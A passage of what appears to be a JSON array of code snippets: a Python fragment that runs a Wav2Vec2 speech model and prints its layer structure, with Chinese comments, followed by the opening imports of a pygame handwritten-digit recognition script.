…
ional) \u2013 The sampling rate at which the raw_speech input was sampled. It is strongly recommended to pass sampling_rate at the forward call to prevent silent errors.\n- padding_value (float, defaults to 0.0)\n\"\"\"\ninput_values = processor(speech_array, return_tensors=\"pt\", padding=True) # batch=1\u7684\u8bdd\uff0cpadding\u65e0\u6548\n\n# \u83b7\u53d6\u8f93\u5165\u7279\u5f81\ninput_values = input_values.input_values\nprint(model)\n\"\"\"\nWav2Vec2Model(\n  (feature_extractor): Wav2Vec2FeatureEncoder(\n    (conv_layers): ModuleList(\n      (0): Wav2Vec2GroupNormConvLayer(\n        (conv): Conv1d(1, 512, kernel_size=(10,), stride=(5,), bias=False)\n        (activation): GELUActivation()\n        (layer_norm): GroupNorm(512, 512, eps=1e-05, affine=True)\n      )\n      (1-4): 4 x Wav2Vec2NoLayerNormConvLayer(\n        (conv): Conv1d(512, 512, kernel_size=(3,), stride=(2,), bias=False)\n        (activation): GELUActivation()\n      )\n      (5-6): 2 x Wav2Vec2NoLayerNormConvLayer(\n        (conv): Conv1d(512, 512, kernel_size=(2,), stride=(2,), bias=False)\n        (activation): GELUActivation()\n      )\n    )\n  )\n  # 5*2*2*2*2*2*2 = 320\n  # 320/16000=0.02\n  (feature_projection): Wav2Vec2FeatureProjection(\n    (layer_norm): LayerNorm((512,), eps=1e-05, elementwise_affine=True)\n    (projection): Linear(in_features=512, out_features=768, bias=True)\n    (dropout): Dropout(p=0.1, inplace=False)\n  )\n  (encoder): Wav2Vec2Encoder(\n    (pos_conv_embed): Wav2Vec2PositionalConvEmbedding(\n      (conv): ParametrizedConv1d(\n        768, 768, kernel_size=(128,), stride=(1,), padding=(64,), groups=16\n        (parametrizations): ModuleDict(\n          (weight): ParametrizationList(\n            (0): _WeightNorm()\n          )\n        )\n      )\n      (padding): Wav2Vec2SamePadLayer()\n      (activation): GELUActivation()\n    )\n    (layer_norm): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n    (dropout): Dropout(p=0.1, inplace=False)\n    (layers): ModuleList(\n      (0-11): 12 x Wav2Vec2EncoderLayer(\n        (attention): Wav2Vec2Attention(\n          (k_proj): Linear(in_features=768, out_features=768, bias=True)\n          (v_proj): Linear(in_features=768, out_features=768, bias=True)\n          (q_proj): Linear(in_features=768, out_features=768, bias=True)\n          (out_proj): Linear(in_features=768, out_features=768, bias=True)\n        )\n        (dropout): Dropout(p=0.1, inplace=False)\n        (layer_norm): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n        (",
    "import numpy as np\nimport pygame\nfrom pygame import Vector2\nfrom pygame import draw\nfrom pygame.draw import circle, line, aaline, rect\nfrom pygame.transform import scale, smoothscale\nimport pygame.display\nimport pygame.mouse\nimport pygame.event\nimport pygame.time\nimport neural_network\nfrom handwritten_digits_recognition_tools
…
